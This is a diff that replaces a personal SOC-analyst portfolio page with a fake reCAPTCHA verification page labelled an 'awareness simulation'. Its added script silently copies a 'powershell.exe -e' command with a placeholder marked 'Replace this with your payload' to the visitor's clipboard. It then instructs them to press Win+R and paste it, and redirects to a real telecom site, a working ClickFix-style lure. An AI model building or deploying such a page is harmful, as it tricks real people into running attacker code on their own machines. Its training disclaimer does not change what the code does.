@@ -1,149 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Anwar | SOC L1 Analyst</title>
+  <meta charset="UTF-8">
+  <title>Verification Awareness Simulation</title>
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0f172a;
-      color: #f1f5f9;
-    }
-
-    header {
-      background-color: #1e293b;
-      padding: 20px;
-      text-align: center;
-    }
-
-    header h1 {
-      margin: 0;
-      font-size: 2rem;
-    }
-
-    nav {
-      background-color: #334155;
-      padding: 10px;
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
       display: flex;
       justify-content: center;
-      gap: 20px;
+      align-items: center;
+      height: 100vh;
     }
-
-    nav a {
-      color: #cbd5e1;
-      text-decoration: none;
-      font-weight: bold;
-      transition: color 0.3s;
-    }
-
-    nav a:hover {
-      color: #38bdf8;
-    }
-
-    main {
-      padding: 40px 20px;
-      max-width: 900px;
-      margin: auto;
-    }
-
-    section {
-      margin-bottom: 60px;
-    }
-
-    h2 {
-      color: #38bdf8;
-    }
-
-    .card {
-      background: #1e293b;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      transition: transform 0.3s ease;
-    }
-
-    .card:hover {
-      transform: translateY(-5px);
-    }
-
-    .btn {
-      display: inline-block;
-      padding: 10px 20px;
-      background-color: #38bdf8;
-      color: #0f172a;
-      text-decoration: none;
+    .container {
+      background: #fff;
+      padding: 30px;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
       border-radius: 8px;
-      margin-top: 20px;
-      font-weight: bold;
     }
-
-    footer {
+    h2 {
       text-align: center;
-      padding: 20px;
-      background-color: #1e293b;
-      color: #94a3b8;
+      color: #444;
+    }
+    .field {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #555;
+    }
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .captcha-box {
+      display: flex;
+      align-items: center;
+      border: 1px solid #d3d3d3;
+      padding: 10px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+    }
+    .captcha-box img {
+      margin-left: auto;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4285f4;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .disclaimer {
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>Anwar | SOC Level 1 Analyst</h1>
-    <p>Blue team passion meets real-time threat detection</p>
-  </header>
-
-  <nav>
-    <a href="#about">About</a>
-    <a href="#projects">Tools</a>
-    <a href="#contact">Contact</a>
-  </nav>
-
-  <main>
-    <section id="about">
-      <h2>About Me</h2>
-      <div class="card">
-        <p>Hello! I'm Anwar, currently working as a SOC Level 1 Analyst. My passion lies in threat detection, incident response, and continuously leveling up my skills in cybersecurity. I monitor logs, detect anomalies, and help defend against cyber threats.</p>
-        <p>I enjoy learning through hands-on labs and using tools like Zeek, Wireshark, Suricata, and Splunk. Whether it’s analyzing a suspicious IP or investigating malware behavior, I’m always ready to jump in.</p>
+  <div class="container">
+    <h2>reCAPTCHA Verification</h2>
+    <form onsubmit="verify(); return false;">
+      <div class="field">
+        <label for="fname">First Name</label>
+        <input type="text" id="fname" required>
       </div>
-    </section>
-
-    <section id="projects">
-      <h2>My Toolbox</h2>
-      <div class="card">
-        <ul>
-          <li>🔍 Splunk - For log monitoring and alerting</li>
-          <li>🛡️ Zeek - Network security monitoring</li>
-          <li>📊 Suricata - IDS/IPS engine</li>
-          <li>🧠 Wireshark - Packet analysis and forensics</li>
-          <li>⚡ CyberChef - Quick data analysis and decoding</li>
-        </ul>
+      <div class="field">
+        <label for="lname">Last Name</label>
+        <input type="text" id="lname" required>
       </div>
-    </section>
-
-    <section id="contact">
-      <h2>Contact Me</h2>
-      <div class="card">
-        <p>If you’d like to get in touch, collaborate, or ask a question — I’m open! Just click the button below:</p>
-        <a href="mailto:anwar@example.com" class="btn">Email Me</a>
+      <div class="field">
+        <label for="email">Email</label>
+        <input type="email" id="email" required>
       </div>
-    </section>
-  </main>
-
-  <footer>
-    © 2025 Anwar — Built with pure HTML, CSS & JS
-  </footer>
+      <div class="captcha-box">
+        <input type="checkbox" id="robotCheck" required>
+        <label for="robotCheck">I'm not a robot</label>
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="24">
+      </div>
+      <button type="submit">Verify</button>
+    </form>
+    <p class="disclaimer">
+      This is an awareness simulation page for training purposes only. No data is submitted or collected.
+    </p>
+  </div>
 
   <script>
-    // Smooth scroll
-    document.querySelectorAll("nav a").forEach(anchor => {
-      anchor.addEventListener("click", function(e) {
-        e.preventDefault();
-        document.querySelector(this.getAttribute("href")).scrollIntoView({
-          behavior: "smooth"
+    function verify() {
+      var cmd = 'powershell.exe -e <INSERT_ENCODED_COMMAND>'; // Replace this with your payload
+
+      // Try modern clipboard API
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(cmd).then(function () {
+          alert("Verification complete. Please press Win + R and paste the command to continue.");
+          setTimeout(() => {
+            window.location.href = "https://www.omantel.om";
+          }, 5000);
+        }).catch(function () {
+          fallbackCopy(cmd);
         });
-      });
-    });
+      } else {
+        fallbackCopy(cmd);
+      }
+    }
+
+    function fallbackCopy(cmd) {
+      try {
+        var textarea = document.createElement('textarea');
+        textarea.value = cmd;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+      } catch (err) {
+        console.error("Fallback copy failed:", err);
+      }
+      alert("Verification complete. Please press Win + R and paste the command to continue.");
+      setTimeout(() => {
+        window.location.href = "https://www.omantel.om";
+      }, 5000);
+    }
   </script>
 </body>
 </html>
